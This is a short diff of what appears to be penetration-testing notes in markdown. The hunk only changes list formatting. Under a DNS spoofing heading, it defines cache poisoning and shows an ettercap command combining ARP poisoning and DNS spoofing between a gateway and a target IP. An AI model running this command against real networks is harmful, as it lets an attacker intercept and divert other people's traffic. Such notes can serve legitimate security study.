@@ -20,7 +20,7 @@ maltego
 # Exploitation 
 ## DNS Spoofing 
 - Introducing corrupt DNS data into cache, causing it to return incorrect IP address, diverting traffic to attacker's computer 
-- ```
+ ```
 ettercap -T -q -M arp:remote /<gateway-ip>// /<target-ip>// -P dns_spoof
 ```
 
